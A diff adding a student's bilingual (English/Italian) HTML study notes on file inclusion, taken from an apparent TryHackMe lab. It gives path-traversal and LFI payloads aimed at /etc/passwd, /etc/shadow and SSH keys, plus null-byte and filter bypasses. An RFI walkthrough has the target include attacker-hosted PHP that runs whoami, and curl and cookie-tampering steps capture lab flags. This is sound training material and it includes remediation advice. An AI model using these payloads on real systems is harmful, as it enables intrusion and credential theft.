@@ -21,16 +21,260 @@
 <div class="flex-container">
     
         <div id="inizio" class="tools-container">
-        <a href="#inbuilt"  class="button-link">The in-built browser tools</a>
+        <a href="#fileincl"  class="button-link">File Inclusion</a>
+		<a href="#lfi"  class="button-link">Local File Inclusion - LFI</a>
+		<a href="#rfi"  class="button-link">Remote File Inclusion - RFI</a>
+		<a href="#rem"  class="button-link">Remediation</a>
+		<a href="#esempio"  class="button-link">Example</a>
                    
         </div>
 <div class="sub-container">    
-    <h2 id="inbuilt">The in-built browser tools</h2> 
-    <p>Su browser tipo Google Chrome, Mozilla Firefox, ecc, è possibile accedere tramite click destro su mouse o opzioni vari strumenti di analisi.</p>   
-    
+    <h2 id="fileincl">File Inclusion</h2> 
+<p>Essential knowledge to exploit file inclusion vulnerabilities, including Local File Inclusion (LFI), Remote File Inclusion (RFI), and directory traversal. <br>
+In some scenarios, web applications are written to request access to files on a given system, including images, static text, and so on via parameters. Parameters are query parameter strings attached to the URL that could be used to retrieve data or perform actions based on user input. <br>
+<code>http://webapp.thm/get.php?file=userCV.pdf</code><br>
+Protocollo= http 		FileName=get.php	Query string begin= ? <br>
+parameters are used with Google searching, where GET requests pass user input into the search engine.<code> https://www.google.com/search?q=TryHackMe </code><br>
+-Why do File inclusion vulnerabilities happen?<br>
+File inclusion vulnerabilities are commonly found and exploited in various programming languages for web applications, such as PHP that are poorly written and implemented. The main issue of these vulnerabilities is the input validation, in which the user inputs are not sanitized or validated, and the user controls them. When the input is not validated, the user can pass any input to the function, causing the vulnerability.<br>
+-What is the risk of File inclusion?<br>
+By default, an attacker can leverage file inclusion vulnerabilities to leak data, such as code, credentials or other important files related to the web application or operating system. Moreover, if the attacker can write files to the server by any other means, file inclusion might be used in tandem to gain remote command execution (RCE).<br>
+</p>
     <a href="#inizio"  class="button-link">Torna all'indice!</a>
     <hr>
-</div>
+<h2 id="path">Path traversal</h2> 
+<p>Also known as Directory traversal, a web security vulnerability allows an attacker to read operating system resources, such as local files on the server running an application.
+The attacker exploits this vulnerabilities by manipulating and abusing the web application's URL to locate and access files or directories stored outside the application's root directory.
+<br>
+Path traversal vulnerabilities occur when the user's input is passed to a function such as file_get_contents in PHP. It's important to note that the function is not the main contributor to the vulnerability. Often poor input validation or filtering is the cause of the vulnerability. In PHP, you can use the file_get_contents to read the content of a file.<br>
+<code>https://www.php.net/manual/en/function.file-get-contents.php</code>
+The following graph shows how a web application stores files in /var/www/app . The happy path would be the user requesting the contents of userCV.pdf from a defined path /var/www/app/CVs<br>
+<br>
+Attacker-><code>http://webapp.thm/get.php?file=../../../../etc/passwd</code>->Web App is served at /var/www/app ->get.php--> etc--> passwd-->passwd's content--> Attacker<br>
+............................................................................................................ |________/var/www/app/CVs/userCV.pdf<br>
+<br>
+We can test out the URL parameter by adding payloads to see how the web application behaves. Path traversal attacks, also knows as the dot-dot-slash attack, take advantage of moving the directory one step up using the double dots ../ <br>
+If the attacker finds the entry point, which in this case <b>get.php?file=</b> , then the attacker may send something as follows,<code> http://webapp.thm/get.php?file=../../../../etc/passwd</code><br>
+<br>
+Similarly, if the web application runs on a Windows server, the attacker needs to provide Windows paths. For example, if the attacker wants to read the boot.ini file located in c:\boot.ini, then the attacker can try the following depending on the target OS version:<br>
+<code>http://webapp.thm/get.php?file=../../../../boot.ini </code>   or<br>
+<code>http://webapp.thm/get.php?file=../../../../windows/win.ini</code>   <br> 
+<br>
+-Sometimes, developers will add filters to limit access to only certain files or directories. Below are some common OS files you could use when testing.<br>
+<br>
+<i>Location  + Description</i><br>
+<code>/etc/issue</code> 	Contains a message or system identification to be printed before the login prompt<br>
+<code>/etc/profile</code>	Control system-wide default variables, such a Export variables, File creation mask (umask), terminal types, Mail messages to indicate when new mail has arrived<br>
+<code>/proc/version</code>	Specifies the version of the Linux kernel<br>
+<code>etc/passwd</code>	has all registered users that have access to a system<br>
+<code>/etc/shadow</code>	contains information about the system's users' passwords<br>
+<code>/root/.bash_history</code>	contains the history commands for root users<br>
+<code>/var/log/dmessage</code>		contains global system messages, including the messages that are logged during system startup<br>
+<code>/var/mail/root</code>	all emails for root user<br>
+<code>/root/.ssh/id_rsa</code>	Private SSH keys for a root or any knows valid user on the server<br>
+<code>/var/log/apache2/access.log</code>	the accessed requests for Apache web server<br>
+<code>C:/boot.ini</code>	Contains the boot options for computer with BIOS firmware<br>
+</p>
+    <a href="#inizio"  class="button-link">Torna all'indice!</a>
+    <hr>
+<h2 id="lfi">Local File Inclusion - LFI</h2> 
+<p>LFI attacks against web applications are often due to a developers' lack of security awareness. With PHP, using functions such as include, require, include_once, and require_once often contribute to vulnerable web applications.<br>
+we'll be picking on PHP, but it's worth noting LFI vulnerabilities also occur when using other languages such as ASP, JSP, or even in Node.js apps. LFI exploits follow the same concepts as path traversal.<br>
+<b>1.</b> Suppose the web application provides two languages, and the user can select between the EN and AR<br>
+<code>?PHP <br>
+	include($_GET["lang"]);<br>
+? ><br>
+</code><br>
+The PHP code above uses a GET request via the URL parameter lang to include the file of the page. The call can be done by sending the following HTTP request as follows: http://webapp.thm/index.php?lang=EN.php to load the English page or http://webapp.thm/index.php?lang=AR.php to load the Arabic page, where EN.php and AR.php files exist in the same directory.<br>
+Theoretically, we can access and display any readable file on the server from the code above if there isn't any input validation. Let's say we want to read the /etc/passwd file, which contains sensitive information about the users of the Linux operating system, we can try the following:<br>
+ <code>http://webapp.thm/get.php?file=/etc/passwd</code><br>
+(In this case, it works because there isn't a directory specified in the include function and no input validation.)<br>
+<b>2.</b> Next, In the following code, the developer decided to specify the directory inside the function.<br>
+<code>?PHP <br>
+	include("languages/". $_GET['lang']); <br>
+? ><br>
+</code><br>
+In the above code, the developer decided to use the include function to call PHP pages in the languages directory only via lang parameters.<br>
+If there is no input validation, the attacker can manipulate the URL by replacing the lang input with other OS-sensitive files such as /etc/passwd.<br>
+Again the payload looks similar to the path traversal, but the include function allows us to include any called files into the current page. The following will be the exploit:<br>
+<code>http://webapp.thm/index.php?lang=../../../../etc/passwd </code><br>
+<br><b>3.</b> In the first two cases, we checked the code for the web app, and then we knew how to exploit it. However, in this case, we are performing black box testing, in which we don't have the source code. In this case, errors are significant in understanding how the data is passed and processed into the web app.<br>
+->In this scenario, we have the following entry point: http://webapp.thm/index.php?lang=EN. If we enter an invalid input, such as THM, we get the following error:<br>
+Warning: include(languages/THM.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12<br>
+->By entering THM as input, an error message shows what the include function looks like: include(languages/THM.php);.<br>
+->If you look at the directory closely, we can tell the function includes files in the languages directory is adding .php at the end of the entry. Thus the valid input will be something as follows: index.php?lang=EN, where the file EN is located inside the given languages directory and named EN.php.<br>
+->Also, the error message disclosed another important piece of information about the full web application directory path which is /var/www/html/THM-4/.<br>
+To exploit this, we need to use the ../ trick, as described in the directory traversal section, to get out the current folder. Let's try the following:  <code>   http://webapp.thm/index.php?lang=../../../../etc/passwd</code><br>
+-><b>Note</b> that we used 4 ../ because we know the path has four levels /var/www/html/THM-4. But we still receive the following error:<br>
+Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12<br>
+->It seems we could move out of the PHP directory but still, the include function reads the input with .php at the end! This tells us that the developer specifies the file type to pass to the include function. To bypass this scenario, we can use the NULL BYTE, which is %00.<br>
+-> Using null bytes is an injection technique where URL-encoded representation such as %00 or 0x00 in hex with user-supplied data to terminate strings. You could think of it as trying to trick the web app into disregarding whatever comes after the Null Byte.<br>
+By adding the Null Byte at the end of the payload, we tell the include function to ignore anything after the null byte which may look like:<br>
+<code>include("languages/../../../../../etc/passwd%00").".php"</code>); which is equivalent to <code>include("languages/../../../../../etc/passwd")</code>;<br>
+-><b>Note:</b> the %00 trick is fixed and not working with PHP 5.3.4 and above.<br>
+<br><b>4.</b> In this section, the developer decided to filter keywords to avoid disclosing sensitive information! The /etc/passwd file is being filtered. There are two possible methods to bypass the filter. First, by using the NullByte %00 or the current directory trick at the end of the filtered keyword /.. The exploit will be similar to<code> http://webapp.thm/index.php?lang=/etc/passwd/.</code> <br>
+We could also use<code> http://webapp.thm/index.php?lang=/etc/passwd%00</code>.<br>
+->To make it clearer, if we try this concept in the file system using cd .., it will get you back one step; however, if you do cd ., It stays in the current directory. Similarly, if we try /etc/passwd/.., it results to be /etc/ and that's because we moved one to the root. Now if we try /etc/passwd/., the result will be /etc/passwd since dot refers to the current directory.<br>
+<br><b>5.</b> Next, in the following scenarios, the developer starts to use input validation by filtering some keywords. Let's test out and check the error message!<br>
+<code>http://webapp.thm/index.php?lang=../../../../etc/passwd</code><br>
+-> We got the following error!<br>
+Warning: include(languages/etc/passwd): failed to open stream: No such file or directory in /var/www/html/THM-5/index.php on line 15<br>
+->If we check the warning message in the include(languages/etc/passwd) section, we know that the web application replaces the ../ with the empty string. There are a couple of techniques we can use to bypass this.<br>
+-First, we can send the following payload to bypass it:<code> ....//....//....//....//....//etc/passwd</code>.<br>
+This works because the PHP filter only matches and replaces the first subset string ../ it finds and doesn't do another pass, leaving what is pictured below.<br>
+....//....//etc/passwd   ---> ../../etc/passwd<br>
+<br><b>6.</b> Finally, we'll discuss the case where the developer forces the include to read from a defined directory! For example, if the web application asks to supply input that has to include a directory such as: http://webapp.thm/index.php?lang=languages/EN.php then, to exploit this, we need to include the directory in the payload like so: ?lang=languages/../../../../../etc/passwd.<br>
 
+<i>esercizio #3:<br></i>
+<code>http://10.81.138.123/lab3.php?file=../../../../etc/passwd%00</code><br>
+
+<i>esercizio #4:<br></i>
+<code>http://10.81.138.123/lab4.php?file=/etc/passwd%00</code><br>
+
+<code>http://10.81.138.123/lab4.php?file=/etc/passwd/</code><br>
+-> file_get_contents ( function is causing the directory traversal)<br>
+
+<i>esercizio #5<br></i>
+<code>http://10.81.138.123/lab5.php?file=....//....//....//....//etc/passwd%00</code><br>
+<code>http://10.81.138.123/lab5.php?file=....//....//....//....//etc/passwd</code><br>
+
+<i>esercizio #6<br></i>
+the directory that has to be in the input field? THM-profile<br>
+
+<code>http://10.81.138.123/lab6.php?file=THM-profile%2F/../../../../../etc/os-release</code>-> ho scritto THM-profile e una cosa a caso, per ottenere la query, poi aggiunto / ../ (5volte) e la cartella di mio interesse<br>
+->NAME="Ubuntu" VERSION="12.04.5 LTS, Precise Pangolin" ID=ubuntu ID_LIKE=debian PRETTY_NAME="Ubuntu precise (12.04.5 LTS)" VERSION_ID="12.04" <br>
+</p>
+    <a href="#inizio"  class="button-link">Torna all'indice!</a>
+    <hr>	
+<h2 id="rfi">Remote File Inclusion - RFI</h2> 
+<p>Remote File Inclusion (RFI) is a technique to include remote files into a vulnerable application. Like LFI, the RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into include function. One requirement for RFI is that the allow_url_fopen option needs to be on.<br>
+The risk of RFI is higher than LFI since RFI vulnerabilities allow an attacker to gain Remote Command Execution (RCE) on the server. Other consequences of a successful RFI attack include:<br>
+Sensitive Information Disclosure<br>
+Cross-site Scripting (XSS)<br>
+Denial of Service (DoS)<br>
+<br>
+An external server must communicate with the application server for a successful RFI attack where the attacker hosts malicious files on their server. Then the malicious file is injected into the include function via HTTP requests, and the content of the malicious file executes on the vulnerable application server.<br><br>
+<b>RFI steps:</b><br>
+"Attacker" > 1)<code> http://webapp.thm/get.php?file=http://attacker.thm/cmd.txt </code> -> "get.php" -- "http://webapp.thm" > 2) <code> GET http://attacker.thm/cmd.txt</code> -> <code>"http://attacker.thm/cmd.txt" </code> --- cmd.txt<br>
+cmd.txt ----"http://attacker.thm/cmd.txt" > 3) send content of the cmd.txt ----> "http://webapp.thm" -------- 4) injects the content of cmd.txt into include function and execute it > "get.php" -> 5)Send back the results of execution within the get.php page->"Attacker"<br>
+<br>
+above is an example of steps for a successful RFI attack! Let's say that the attacker hosts a PHP file on their own server http://attacker.thm/cmd.txt where cmd.txt contains a printing message Hello THM.<br>
+<code>?PHP echo "Hello THM"; ? ></code><br>
+First, the attacker injects the malicious URL, which points to the attacker's server, such as http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt. If there is no input validation, then the malicious URL passes into the include function. Next, the web app server will send a GET request to the malicious server to fetch the file. As a result, the web app includes the remote file into include function to execute the PHP file within the page and send the execution content to the attacker. In our case, the current page somewhere has to show the Hello THM message.<br>
+<br>
+<i>Esercitazione:</i><br>
+0) su terminale vedo dove mi trovo con pwd, e proseguo a creare un file cmd.txt con nano<br>
+Ho usato il codice in php come da esempio sul corso THM<br>
+<br>
+1) creare un server web temporaneo:<br>
+Per condividere il tuo file cmd.txt, puoi utilizzare un server web temporaneo. Puoi avviare un server HTTP semplice dalla directory in cui si trova il file. Ecco un comando che puoi usare nel terminale:<br>
+<code> python3 -m http.server 8080. </code><br>
+Questo avvierà un server sulla porta 8080. Successivamente, usa l'IP del tuo attacco e la porta per accedere al file: http://<tuo_ip>:8080/cmd.txt. Assicurati che il tuo firewall non blocchi la porta e che il server sia in esecuzione.<br>
+(La directory in cui salvare il tuo file cmd.txt dipende da dove hai avviato il terminale. Quando apri il terminale, di solito ti trovi nella home directory dell'utente. Puoi navigare in altre directory usando il comando cd. Se vuoi sapere in quale directory ti trovi attualmente, usa il comando pwd. Se desideri creare una nuova directory per il tuo progetto, puoi usare mkdir nome_directory e poi navigarci dentro con cd nome_directory. Una volta che sei nella directory desiderata, puoi salvare il file cmd.txt lì.)<br>
+<br>
+2) Ora nel sito<code> http://10.80.140.30/playground.php?file=</code><br>
+possiamo incollare il nostro Url <code>http://10.80.81.213:8080/cmd.txt</code><br>
+<code>http://10.80.140.30/playground.php?file=http://10.80.81.213:8080/cmd.txt</code><br>
+come risultato i comandi contenuti nel file cmd.txt vengono eseguiti<br>
+<br>
+3) nel file cmd.txt possiamo scrivere un codice che ci permette di eseguire comandi Linux o scoprire il contenuto di alcune directory <br>
+<code>? PHP echo "Hello THM"; </code> -> Semplice visualizzazione di una stringa <br>
+<code>exec('whoami', $output);</code> -> esecuzione comando <br>
+<code>echo $output[0];</code>  -> visualizzazione risultato del comando<br>
+<code>$passwd = file_get_contents('/etc/passwd');</code> -> dichiarazione variabile che prende il contenuto di un file<br>
+<code>echo nl2br(htmlspecialchars($passwd));</code> -> visualizzazione output (htmlspecialchars() → evita problemi di sicurezza , nl2br() → va a capo nel browser<br>
+<code>? ></code>
+
+</p>
+    <a href="#inizio"  class="button-link">Torna all'indice!</a>
+    <hr>
+<h2 id="rem">Remediation</h2> 
+<p>
+To prevent the file inclusion vulnerabilities, some common suggestions include:<br>
+Keep system and services, including web application frameworks, updated with the latest version.<br>
+Turn off PHP errors to avoid leaking the path of the application and other potentially revealing information.<br>
+A Web Application Firewall (WAF) is a good option to help mitigate web application attacks.<br>
+Disable some PHP features that cause file inclusion vulnerabilities if your web app doesn't need them, such as allow_url_fopen on and allow_url_include.<br>
+Carefully analyze the web application and allow only protocols and PHP wrappers that are in need.<br>
+Never trust user input, and make sure to implement proper input validation against file inclusion.<br>
+Implement whitelisting for file names and locations as well as blacklisting.<br>
+</p>
+    <a href="#inizio"  class="button-link">Torna all'indice!</a>
+    <hr>
+<h2 id="esempio">Example</h2> 
+<p><b>***Esercitazione finale***</b><br>
+<i>Steps for testing for LFI</i><br>
+<b>1. Find an entry point that could be via GET, POST, COOKIE, or HTTP header values!</b><br>
+<code>http://10.80.140.30/challenges/chall1.php?file=welcome.php#</code> <br>-> The input form is broken! You need to send `POST` request with `file` parameter! <br>
+<code>http://10.80.140.30/challenges/chall2.php</code> <br>-> Only admins can access this page!<br>
+<code>http://10.80.140.30/challenges//chall3.php?file=3</code> <br>-> Warning: include(.php) [function.include]: failed to open stream: No such file or directory in /var/www/html/chall3.php on line 30<br>
+Warning: include() [function.include]: Failed opening 'etcflag.php' for inclusion (include_path='.:/usr/lib/php5.2/lib/php') in /var/www/html/chall3.php on line 30<br>
+<br>
+<b>2. Enter a valid input to see how the web server behaves.</b><br>
+<b>3. Enter invalid inputs, including special characters and common file names.</b><br>
+<b>4. Don't always trust what you supply in input forms is what you intended! Use either a browser address bar or a tool such as Burpsuite.</b><br>
+<b>5. Look for errors while entering invalid input to disclose the current path of the web application; if there are no errors, then trial and error might be your best option.</b><br>
+<b>6. Understand the input validation and if there are any filters!</b><br>
+<b>7. Try the inject a valid entry to read sensitive files</b><br>
+<br><br>
+<b>1) Manual Discovery - HTTP Headers</b><br>
+<code>curl http://10.80.140.30 -v | head -n 10<br>
+*   Trying 10.80.140.30:80...<br>
+* TCP_NODELAY set<br>
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current<br>
+                                 Dload  Upload   Total   Spent    Left  Speed<br>
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Connected to 10.80.140.30 (10.80.140.30) port 80 (#0)<br>
+ GET / HTTP/1.1<br>
+ Host: 10.80.140.30<br>
+ User-Agent: curl/7.68.0<br>
+ Accept: */*<br>
+ <br>
+* Mark bundle as not supporting multiuse<br>
+ HTTP/1.1 200 OK<br>
+ Server: nginx/1.18.0 (Ubuntu)<br>
+ Date: Sat, 24 Jan 2026 08:47:49 GMT<br>
+ Content-Type: text/html<br>
+ Content-Length: 1754<br>
+ Connection: keep-alive<br>
+ Vary: Accept-Encoding<br>
+ <br>
+{ [1754 bytes data]<br>
+100  1754  100  1754    0     0   570k      0 --:--:-- --:--:-- --:--:--  570k<br>
+</code><br>
+Header resta invariato su chall1.php e su chall3.php<br>
+Su chall2.php  c'è questa opzione -> <code>Set-Cookie: THM=Guest; expires=Sat, 24-Jan-2026 09:39:38 GMT; path=/</code>
+<hr><br>
+Ho provato tramite inspect, cambiare da GET a POST, ma ovviamente ad ogni refresh torna alle impostazioni iniziali ( bisogna utilizzare un software aggiuntivo? Si, usano BurpSuite ).In ogni caso problema risolto grazie a curl <br>
+<code>curl -X POST -d 'file=/etc/flag1' http://10.80.140.30/challenges/chall1.php</code><br>
+<i>F1x3d-iNpu7-f0rrn  -> flag 1</i>
+<hr><br>
+<b>2)Cookie Tampering</b><br>
+	A) <code>curl -H 'Cookie: THM=Admin' http://10.80.140.30/challenges/chall2.php</code><br>
+-> Sapendo che i cookie ha THM=Guest, possiamo alterarlo con Admin per accedere , ottenendo i vari errori come da browser<br>
+-> Purtroppo con curl non son riuscito ad ottenere la flag<br>
+<br>
+	B1) Se si va su Inspect > Storage > Cookies, Possiamo cambiare il valore da Guest a Admin, e poi riaggiornando la pagina si può procedere.<br>
+Warning: include(includes/Admin.php) [function.include]: failed to open stream: No such file or directory in /var/www/html/chall2.php on line 37
+<br>	
+	B2) Sempre su Storage > Cookies  modificare nuovamente il valore da Admin a ../../../../etc/flag2%00<br>
+<i>c00k13_i5_yuMmy1 -> flag 2</i>
+<hr><br>
+<b>Per la Flag 3 ho provato con curl</b><br>
+<code>curl -X POST -d 'file=../../../../etc/flag3%00' http://10.80.172.89/challenges/chall3.php</code><br>
+cosi mi da errore  ( o meglio non mi fa visualizzare l'output perché pensa che sia in binario?)<br>
+<code>curl --output - -X POST -d 'file=../../../../etc/flag3%00' http://10.80.172.89/challenges/chall3.php</code><br>
+<i>P0st_1s_w0rk1in9</i> -> flag 3<br>
+</p>
+    <a href="#inizio"  class="button-link">Torna all'indice!</a>
+    <hr>	
+</div>
 </body>
 </html>
+
+
+
+
+
+
+
+
